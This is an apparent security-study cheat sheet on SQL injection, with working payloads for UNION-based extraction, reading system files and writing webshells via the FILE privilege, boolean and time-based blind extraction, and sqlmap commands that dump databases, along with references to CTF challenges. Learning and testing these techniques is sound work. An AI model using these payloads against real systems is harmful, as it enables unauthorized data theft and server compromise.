# SQL Injection (SQLi)

## Table of Contents

- [SQL Injection (SQLi)](#sql-injection-sqli)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [UNION-Based Injection](#union-based-injection)
    - [Step 1 — Determine the Number of Columns](#step-1--determine-the-number-of-columns)
    - [Step 2 — Identify Which Columns Are Reflected in the Page](#step-2--identify-which-columns-are-reflected-in-the-page)
    - [Step 3 — Extract Useful Data](#step-3--extract-useful-data)
      - [Determine the database Version](#determine-the-database-version)
      - [Determine the database user name](#determine-the-database-user-name)
      - [Determine the table names](#determine-the-table-names)
      - [Determine the column names](#determine-the-column-names)
  - [File Read / Write via `FILE` Privilege](#file-read--write-via-file-privilege)
      - [Read a file](#read-a-file)
      - [Write a file](#write-a-file)
  - [Blind SQL Injection](#blind-sql-injection)
    - [Boolean-Based Blind SQL Injection](#boolean-based-blind-sql-injection)
      - [Boolean-Based Blind SQLi: The Concept](#boolean-based-blind-sqli-the-concept)
      - [Boolean-Based Blind SQLi: Basic Vulnerability Test](#boolean-based-blind-sqli-basic-vulnerability-test)
      - [Boolean-Based Blind SQLi: Extracting Data Character by Character](#boolean-based-blind-sqli-extracting-data-character-by-character)
    - [Time-Based Blind SQL Injection](#time-based-blind-sql-injection)
      - [Time-Based Blind SQLi: The Concept](#time-based-blind-sqli-the-concept)
      - [Time-Based Blind SQLi: Basic Vulnerability Test](#time-based-blind-sqli-basic-vulnerability-test)
      - [Time-Based Blind SQLi: Extracting Data Character by Character](#time-based-blind-sqli-extracting-data-character-by-character)
  - [Automated Exploitation with `sqlmap`](#automated-exploitation-with-sqlmap)
  - [Files](#files)
  - [References](#references)
    - [Challenges](#challenges)
    - [Web Sites](#web-sites)

---

## Overview

Techniques for identifying and exploiting SQL injection vulnerabilities, from basic UNION-based extraction to blind injection and automated tooling.

---

## UNION-Based Injection

In SQL, `UNION` is used to return an extra set of data along with the initial `SELECT` statement. 

As an attacker, you can leverage this by injecting the `UNION` operator into a vulnerable parameter to append your own SQL statements to the original query and return data from additional columns and tables alongside the legitimate response.

Two conditions must be met for a `UNION SELECT` query to succeed:
1. The number of columns must match the original `SELECT` statement.
2. The data types of each column must be compatible.

### Step 1 — Determine the Number of Columns

As the injected `SELECT` statement must have the same number of columns as the existing statement, you first need to determine the number of columns in the current `SELECT` statement.

You can do this with the `ORDER BY n` clause and observing the server's responses to queries starting at 1, and incrementing `n` by 1 until you receive an error.

The last successful value is the column count.

For example,
```sql
' ORDER BY 1#
```
```
200 OK
```
```sql
' ORDER BY 2#
```
```
200 OK
```
```sql
' ORDER BY 3#
```
```
500 Error or page does not render properly
```
In this example, the corrent `SELECT` statement is using two (2) columns

URL-encoded payload for the examples above:
```sql
'+ORDER+BY+1%23
'+ORDER+BY+2%23
'+ORDER+BY+3%23
```
Once you have determined the number of columns, it's time to identify the vulnerable columns on the page.

### Step 2 — Identify Which Columns Are Reflected in the Page

To do this, you can inject several integer values onto the site page with a `UNION SELECT` query and confirm what shows up in the page.

For instance, the following UNION SELECT statement with five (5) columns will show the numbers of the vulnerable columns on the page.

```sql
' UNION SELECT 1,2,3,4,5#
```

URL-encoded payload:
```sql
'+UNION+SELECT+1,2,3,4,5%23
```

### Step 3 — Extract Useful Data

#### Determine the database Version
The following `UNION SELECT` statement with two (2) columns can be used to check the database version.

```sql
' UNION SELECT @@version,NULL#
```
URL-encoded payload:
```sql
'+UNION+SELECT+%40%40version,NULL%23
```

#### Determine the database user name
The following `UNION SELECT` statement with two (2) columns can be used to check the database user name.

```sql
' UNION SELECT USER(),NULL#
```

URL-encoded payload:
```sql
'+UNION+SELECT+USER(),NULL%23
```

#### Determine the table names
In order to extract data from the database, you will need to understand the structure of the database.

To list all table names in the current, you can run the following command for a `SELECT` statement with five (5) columns.

```sql
' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database()#
```

#### Determine the column names
After finding out the tables that exist in the database, you need to understand the structure of the columns
in each table.

You can do this with the following command, substituting `table_name="customers"` with the appropriate name of the table.

```sql
' UNION SELECT 1,group_concat(column_name, 0x0a),3,4,5 FROM information_schema.columns WHERE table_name="customers"#
```

> [!TIP]
> - If a web app has parameters vulnerable to SQL injection, then use Burp Suite Repeater to iterate on payloads.
> - To confirm a particular paremeter is vulnerable, alter the GET request by adding a single quote (`'`) to the parameter, press `Send` to submit the altered request, and observe the response for errors before trying the actual attack.
> - After confirming the error, add a single quote (`'`) followed by the desired SQL query command building up to a full `UNION SELECT` and check the responses.

---

## File Read / Write via `FILE` Privilege

If the database user has the `FILE` privilege, it is possible to read from and write to the server's filesystem directly from SQL queries.

The `FILE` privilege enables:

- **Reading Files:** Allows using the `LOAD_FILE()` function to read files from the server's filesystem, such as configuration files or other accessible files.

- **Writing Files:** Enables the use of commands like `SELECT ... INTO OUTFILE` or `SELECT ... INTO DUMPFILE` to write data from the database into a file on the server.

Without the `FILE` privilege, the user cannot perform these file read/write operations on the server's filesystem.

#### Read a file
To read a file (e.g., `/etc/passwd`) in a query with four (4) columns, you can use the following query.

```sql
'+UNION+SELECT+LOAD_FILE('/etc/passwd'),NULL,NULL,NULL%23
```

#### Write a file
To write a file to the web root (e.g., `/var/www/html/test.txt`) in a query with four (4) columns, you can use the following query.

```sql
'+UNION+SELECT+NULL,NULL,NULL+INTO+OUTFILE+'/var/www/html/test.txt'%23
```

Writing to the web root can be used to plant a webshell. See [`../rce/`](../rce/README.md) for follow-up exploitation.

---

## Blind SQL Injection

Blind SQL injection is a technique used during an injection attack when the targeted application doesn't expose any data from the database.

The lack of data exposure makes it harder for the tester to determine whether their injection attempt was successful or not and also makes data exfiltration trickier.

To account for lack of data exposure, blind SQL injection can be used to make the database behave in an observable way based on whether the injection attempt was successful, e.g., showing a valid page vs. an empty/error page.

### Boolean-Based Blind SQL Injection

Using the boolean-based blind injection technique forces the application to return different results based on whether the database query returned `true` or `false`.

The result of the query can, in some cases, cause the HTTP request to change or remain the same, indicating successful and unsuccessful payloads.

#### Boolean-Based Blind SQLi: The Concept
As the name suggests, during a boolean-based blind injection, the server responds either with `true` or `false`. These are generally either a valid response or no response at all. It is up to the one exploiting to decide `true` and `false` responses.

The principle is to craft conditions that are definitively `true` or `false` and observe the difference in response.

#### Boolean-Based Blind SQLi: Basic Vulnerability Test
```sql
-- True condition — normal page response expected
' AND 1=1#
```
```sql
-- False condition — empty or error response expected
' AND 1=2#
```

#### Boolean-Based Blind SQLi: Extracting Data Character by Character
Extract data one bit/character at a time by testing conditions against individual characters:

```sql
-- Is the first character of the database name 'a'?
' AND SUBSTRING(database(),1,1)='a'#
```

See [`sqli_boolean_based_blind.py`](./sqli_boolean_based_blind.py) for a script that automates this process.

---

### Time-Based Blind SQL Injection

As opposed to the boolean-based blind injection, time-based blind injection does not rely on the server returning different responses.

This is because the application returns one generic reponse regardless of query outcome informing the user that some action was taken, i.e., there is no visible `true` or `false` difference.

In this case, the attacker constructs their payload to inject a call to make the database "sleep" for a short time when their statement is `true`, e.g., `SLEEP()` in MySQL or `pg_sleep()` in PostgreSQL. If there is a delay in the response, then this confirms the condition was `true`.

#### Time-Based Blind SQLi: The Concept
All database systems have an in-built function for pausing execution (commonly known as a sleep function).

The time-based blind injections are done in the same manner as boolean-based ones, with the difference being that the attacker adds an 'if' statement to the original payload which makes the database sleep if the query they ran is true.

The attacker measures the time between sending the request and obtaining the response from the server. If it matches the delay they set (usually five seconds), it means they found what they were looking for.

#### Time-Based Blind SQLi: Basic Vulnerability Test
A general way to test for a vulnerable parameter would be to add the following query.
```sql
`' OR SLEEP(5) AND '1'='1` 
```

If the server has a delay (~5 seconds) for this payload, but not for a different query, then it will most probably be vulnerable.
```sql
`' OR SLEEP(5) AND '1'='2`
```

#### Time-Based Blind SQLi: Extracting Data Character by Character
Extract data one bit/character at a time by testing conditions against individual characters and putting a delay it is matches:

```sql
-- Sleep 5 seconds if the first character of the database name is 'a'
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)#
```

See [`sqli_time_based_blind.py`](./sqli_time_based_blind.py) for a standard implementation and [`aqli_time_based_blind.py`](./aqli_time_based_blind.py) for an async variant where requests are sent concurrently and response timing is compared across parallel requests, reducing the total time needed to extract data.

---

## Automated Exploitation with `sqlmap`

`sqlmap` automates detection and exploitation of SQL injection across all of the above techniques.

```bash
# Detect injection points and find vulnerabilities on the given URL and parameters
sqlmap -u 'http://TARGET/?username=test&password=test'

# List all databases
sqlmap --dbs -u 'http://TARGET/?username=test&password=test'

# Count entries across all databases
sqlmap -u 'http://TARGET/?username=test&password=test' --count

# List tables in a specific database
sqlmap -u 'http://TARGET/?username=test' -D corporate_database --tables

# Dump a specific row by condition, e.g., entry with a given ID
sqlmap -u 'http://TARGET/?username=test' -D corporate_database -T staff_data --where="employee_id='80-3115917'" --dump

# Dump all rows from a table
sqlmap -u 'http://TARGET/all_messages?to=all_guests' -D spookland -T dinner_guests --dump
```

---

## Files

| File | Description |
|---|---|
| [`sqli_boolean_based_blind.py`](./sqli_boolean_based_blind.py) | Boolean-based blind extraction script |
| [`sqli_time_based_blind.py`](./sqli_time_based_blind.py) | Time-based blind extraction script |
| [`aqli_time_based_blind.py`](./aqli_time_based_blind.py) | Async time-based blind extraction script |

---

## References

### Challenges
| Source | Name |
|---|---|
| Holiday Hack Challenge 2024, Act III | [Deactivate the Ransomware](../../../ctf-writeups/holiday-hack-challenge/2024/act-iii/frostbit-deactivate-the-ransomware/README.md) |

### Web Sites
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PayloadsAllTheThings - SQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)
- [sqlmap Documentation](https://sqlmap.org/)
